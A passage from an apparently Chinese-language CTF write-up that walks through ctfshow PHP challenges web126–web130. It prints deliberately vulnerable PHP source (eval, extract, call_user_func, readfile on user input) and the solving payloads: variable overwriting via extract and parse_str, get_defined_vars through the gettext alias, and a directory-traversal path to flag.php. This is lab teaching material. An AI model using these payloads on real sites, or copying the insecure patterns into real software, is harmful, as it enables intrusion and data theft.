<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>var_export () 类似 var_dump，用于输出或返回一个变量，以字符串形式表示，不同的是其返回的是一个合法的 PHP 代码（测试发现 var_export 并不能正常得到回显）。</p><p>或者使用变量覆盖：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：CTF_SHOW=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">CTF[SHOW</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">COM=</span><span style="color:#b5cea8">2</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fun=</span><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">)</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fl0g=flag_give_me</span></span></code></pre></div></div></figure><p>或者 highlight_file:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">GET:?</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=flag</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php POST:CTF_SHOW=</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">CTF[SHOW</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">COM=</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fun=</span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">])</span></span></code></pre></div></div></figure><h3 id="web126_serverargv利用-变量覆盖"><a class="markdownIt-Anchor" href="#web126_serverargv利用-变量覆盖"></a> web126（$_SERVER ['argv'] 利用 变量覆盖）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'argv'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'fun'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTF_SHOW'</span><span style="color:#d4d4d4">])&amp;&amp;</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTF_SHOW.COM'</span><span style="color:#d4d4d4">])&amp;&amp;!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'fl0g'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|\/|\~|\`|\!|\@|\#|\%|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|\</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">|\-|\</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">|\=|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|\'|\,|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">)&lt;=</span><span style="color:#b5cea8">16</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$c</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">";"</span><span style="color:#d4d4d4">);  </span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$fl0g</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">"flag_give_me"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">             </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">         }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>首先构造两个 CTF_SHOW	CTF_SHOW.COM</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：CTF_SHOW=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">CTF[SHOW</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">COM=</span><span style="color:#b5cea8">2</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fun=</span></span></code></pre></div></div></figure><p>多次尝试 rce 无果，只能尝试变量覆盖。</p><p>parse_str：字符串解析至变量</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：CTF_SHOW=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">CTF[SHOW</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">COM=</span><span style="color:#b5cea8">2</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fun=</span><span style="color:#dcdcaa">parse_str</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">])</span></span>
<span class="line"><span style="color:#d4d4d4">get：?a=</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">+fl0g=flag_give_me</span></span></code></pre></div></div></figure><p>+ 号会被解析为空格。由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">a=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span></span></span></span>_SERVER['argv']</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'argv'</span><span style="color:#d4d4d4">] </span><span style="color:#6a9955">#传递给该脚本的参数。</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955"># 第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数</span></span></code></pre></div></div></figure><p>具体可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/csdn_azuo/article/details/79092479">【php - 零碎知识】$_SERVER ['argv']</a></p><p>例如：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># 设$a = $_SERVER['argv'];	脚本名为AK	传参有：11=2 33</span></span>
<span class="line"><span style="color:#6a9955"># 则有：</span></span>
<span class="line"><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    [</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">]=&gt;</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">) </span><span style="color:#ce9178">"AK"</span></span>
<span class="line"><span style="color:#d4d4d4">    [</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]=&gt;</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">) </span><span style="color:#ce9178">"11=2"</span></span>
<span class="line"><span style="color:#d4d4d4">    [</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">]=&gt;</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">) </span><span style="color:#ce9178">"22"</span><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#6a9955"># 所以参数中，若遇到空格则会截断，识别空格后为另一个参数</span></span></code></pre></div></div></figure><p>提示中还有另外一种写法，但是能力有限看不懂：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">GET:?</span><span style="color:#9cdcfe">$fl0g</span><span style="color:#d4d4d4">=flag_give_me</span></span>
<span class="line"><span style="color:#d4d4d4">POST:CTF_SHOW=</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">CTF[SHOW</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">COM=</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fun=</span><span style="color:#dcdcaa">assert</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">])</span></span></code></pre></div></div></figure><h3 id="web127变量名构造_serverquery_string理解"><a class="markdownIt-Anchor" href="#web127变量名构造_serverquery_string理解"></a> web127（变量名构造 +$_SERVER ['QUERY_STRING'] 理解）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$ctf_show</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$url</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'QUERY_STRING'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">//特殊字符检测</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$url</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\~</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\(</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\)</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\:</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\]</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&lt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\,</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&gt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\\</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$url</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$url</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"嗯哼？"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ctf_show</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">'ilove36d'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>关于 $<em>SERVER ['QUERY_STRING'] 可以参考这篇文章：</em></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/thinksasa/archive/2012/11/11/2765141.html">PHP 中 $_SERVER ["QUERY_STRING"] 函数</a></p><p>基本上，这个变量得到的是 get 传参的？后面的字符串。</p><p>因为不被过滤检测的话会进行变量覆盖，那么我们只需要构造好语句即可：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?ctf show=ilove36d</span></span></code></pre></div></div></figure><p>空格会被替换成下划线，从而成功构造出变量名得到 flag。</p><h3 id="web128gettext别名get_defined_vars"><a class="markdownIt-Anchor" href="#web128gettext别名get_defined_vars"></a> web128（gettext 别名 + get_defined_vars）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$f1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$f2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$f1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">var_dump</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$f1</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$f2</span><span style="color:#d4d4d4">)));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"嗯哼？"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> !</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/[0-9]|[a-z]/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">} </span><span style="color:#569cd6">NULL</span></span></code></pre></div></div></figure><p>这里要使 check () 为真，就不能传 f1 为数字或者字母。这里可以用 gettext 的别名绕过：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211231640235.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221123164033083"></p><p>别名是下划线，也就是说我们能构造 f1 了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?f1=_</span></span></code></pre></div></div></figure><p>由于 include 了 flag.php，那么 flag 的变量应该是注册了的，可以直接拿全部变量：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?f1=_</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">f2=get_defined_vars</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211231642062.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221123164255961"></p><h3 id="web129目录穿越"><a class="markdownIt-Anchor" href="#web129目录穿越"></a> web129（目录穿越）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">stripos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">)&gt;</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">readfile</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><blockquote><p>stripos — 查找字符串首次出现的位置（不区分大小写）</p></blockquote><p>这道题最初也不会，了解之后才知道是目录穿越用法。由于我们要使得 if 成立，则 ctfshow 被查到的位置不能为 0：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?f=/ctfshow/</span><span style="color:#d4d4d4">..</span><span style="color:#d4d4d4">/</span><span style="color:#d4d4d4">..</span><span style="color:#d4d4d4">/</span><span style="color:#d4d4d4">..</span><span style="color:#d4d4d4">/</span><span style="color:#d4d4d4">..</span><span style="color:#d4d4d4">/</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/flag</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#6a9955"># var/www/html/是默认目录</span></span>
<span class="line"><span style="color:#6a9955"># ../可以写多次，穿到根目录之后再写也还是根目录，可以多写几次</span></span></code></pre></div></div></figure><p>传参就能拿到 flag 了。</p><h3 id="web130is模式匹配强等于"><a class="markdownIt-Anchor" href="#web130is模式匹配强等于"></a> web130 (/is 模式匹配 + 强等于)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
